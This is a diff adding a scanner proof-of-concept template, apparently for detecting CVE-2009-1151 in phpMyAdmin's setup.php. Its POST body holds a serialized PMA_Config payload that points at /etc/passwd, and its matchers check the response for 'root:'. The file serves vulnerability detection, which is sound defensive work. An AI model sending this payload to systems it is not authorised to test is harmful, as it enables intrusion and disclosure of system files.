@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "phpMyAdmin setup.php 静态代码注入漏洞验证，通过向 /scripts/setup.php 发送特制 POST 请求检测是否可写入配置文件实现 RCE"
+id = "POC-AVE-2009-0005"
+name = "CVE-2009-1151 PoC"
+severity = "critical"
+tags = ["ave-2009-0005"]
+vuln_id = [
+    "CVE-2009-1151",
+    "AVE-2009-0005",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/scripts/setup.php"
+protocol = "http"
+
+[poc.requests.body]
+content = 'action=save&configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}&eoltype=unix'
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
